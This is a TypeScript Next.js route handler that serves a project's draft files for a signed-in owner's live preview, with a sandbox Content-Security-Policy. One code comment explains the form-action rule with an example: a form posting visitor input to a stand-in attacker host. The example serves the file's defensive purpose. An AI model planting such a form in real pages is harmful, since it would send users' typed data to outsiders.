1	import { db } from "@/lib/db";
2	import { getCurrentUser } from "@/lib/auth";
3	
4	export const dynamic = "force-dynamic";
5	
6	const MIME: Record<string, string> = {
7	  html: "text/html; charset=utf-8",
8	  css: "text/css; charset=utf-8",
9	  js: "text/javascript; charset=utf-8",
10	  map: "application/json",
11	  json: "application/json",
12	  svg: "image/svg+xml",
13	  txt: "text/plain; charset=utf-8",
14	};
15	
16	// MUST stay byte-identical to SANDBOX_CSP in app/api/site/[slug]/[[...path]]/route.ts.
17	// Duplicated rather than shared because these are two independent request
18	// entrypoints; if you change one, change the other.
19	//
20	// form-action / base-uri / object-src are here because NONE of them fall back
21	// to default-src. `connect-src 'none'` was long assumed to mean "a generated
22	// site cannot reach the outside world", but it only ever covered SCRIPTED
23	// requests — a plain <form action="https://attacker.example"> would have
24	// submitted cross-origin with whatever a visitor typed into it.
25	//
26	// One semantic difference from the site route, verified rather than assumed:
27	// PreviewFrame.tsx loads this in an iframe sandboxed WITHOUT allow-same-origin,
28	// so the document sits in an opaque origin where 'self' matches nothing —
29	// `form-action 'self'` is effectively `form-action 'none'` here. Harmless,
30	// since generated sites have no forms at all, but don't be surprised by it.
31	const SANDBOX_CSP =
32	  "default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'none'; frame-ancestors 'self'; form-action 'self'; base-uri 'none'; object-src 'none'";
33	
34	// Serves the DRAFT tree for the live in-editor preview. Owner-only — this is
35	// unpublished work, not a public site.
36	export async function GET(
37	  _req: Request,
38	  { params }: { params: Promise<{ id: string; path?: string[] }> },
39	) {
40	  const user = await getCurrentUser();
41	  if (!user) return new Response("Not signed in.", { status: 401 });
42	
43	  const { id, path } = await params;
44	  const project = await db.project.findFirst({ where: { id, userId: user.id } });
45	  if (!project) return new Response("Not found.", { status: 404 });
46	
47	  const filePath = path && path.length > 0 ? path.join("/") : "index.html";
48	  const file = await db.projectFile.findFirst({
49	    where: { projectId: id, path: filePath, published: false, kind: "build" },
50	  });
51	  if (!file) {
52	    return new Response(
53	      filePath === "index.html"
54	        ? "<!doctype html><html><body style='font:14px sans-serif;color:#888;display:grid;place-items:center;height:100vh'>Nothing built yet — describe what you want on the left.</body></html>"
55	        : "Not found.",
56	      { status: filePath === "index.html" ? 200 : 404, headers: { "Content-Type": "text/html; charset=utf-8" } },
57	    );
58	  }
59	
60	  const ext = filePath.split(".").pop() ?? "";
61	  return new Response(file.content, {
62	    headers: {
63	      "Content-Type": MIME[ext] ?? "application/octet-stream",
64	      "Content-Security-Policy": SANDBOX_CSP,
65	      "Cache-Control": "no-store",
66	    },
67	  });
68	}
